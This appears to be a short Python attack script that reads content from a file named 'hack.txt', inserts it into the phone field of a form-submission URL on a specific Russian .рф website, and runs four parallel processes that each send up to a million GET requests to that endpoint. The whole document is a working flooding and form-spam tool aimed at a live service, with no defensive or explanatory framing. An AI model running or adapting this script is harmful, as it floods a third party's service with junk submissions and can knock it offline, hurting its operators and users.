import requests
from multiprocessing import Process
 
with open('hack.txt','r') as f:
    text = f.read()
 
url = f'https://вбсмп.рф/app?fio=hateh+HTHEQ+srjrjry&birthdate=1987-02-08&phone={text}&email=&doc=6&sToken=22af218cd6debe505ad2ee6c139209b7fab7b5237cf59477'
 
def rr():
    for i in range(1000000):
            data = requests.get(url)
            print(data, i)
def rrr():
    for i in range(1000000):
            data = requests.get(url)
            print(data, i)
def rrrr():
    for i in range(1000000):
            data = requests.get(url)
            print(data, i)
def rrrrr():
    for i in range(1000000):
            data = requests.get(url)
            print(data, i)
 
if __name__ == '__main__':
    proc = Process(target=rr)
    proc1 = Process(target=rrr)
    proc2 = Process(target=rrrr)
    proc3 = Process(target=rrrrr)
    proc.start()
    proc1.start()
    proc2.start()
    proc3.start()
    proc.join()
    proc1.join()
    proc2.join()
    proc3.join()